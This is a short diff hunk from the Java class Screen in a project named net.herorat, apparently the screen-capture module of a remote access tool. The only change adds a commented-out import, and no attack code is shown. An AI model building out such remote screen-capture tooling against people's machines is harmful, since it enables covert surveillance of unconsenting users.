@@ -13,7 +13,7 @@ import javax.imageio.ImageIO;
 import net.herorat.network.Packet;
 import net.herorat.network.Packet10Screen;
 import net.herorat.utils.Base64;
-
+//import javax.xml.bind.DatatypeConverter;
 
 public class Screen
 {
